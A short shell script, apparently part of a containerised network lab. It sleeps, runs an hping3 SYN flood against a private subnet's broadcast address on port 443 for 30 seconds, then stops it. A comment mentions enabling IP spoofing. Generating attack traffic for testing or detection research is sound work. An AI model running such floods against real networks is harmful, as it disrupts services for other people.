#!/bin/sh

# NOTE: SHEBANG MUST BE /bin/sh FOR COMPATIBILITY WITH SYSTEMS
# SINCE DOCKER CONTAINERS DON'T COME WITH BASH

FLOOD_DURATION=30  # The number of seconds the hping3 flood will run

echo "Sleeping, normal network activity"
sleep 20

# --- The Main Command (Run in Background) ---
echo "Executing the hping3 command now for $FLOOD_DURATION seconds..."
hping3 -S 172.19.255.255 -p 443 --flood & # --rand-source to enable IP spoofing

HPING_PID=$! 
sleep $FLOOD_DURATION
kill $HPING_PID

# Wait for the background process to fully terminate before proceeding.
# The '2>/dev/null' suppresses the "Terminated" message.
wait $HPING_PID 2>/dev/null

sleep 10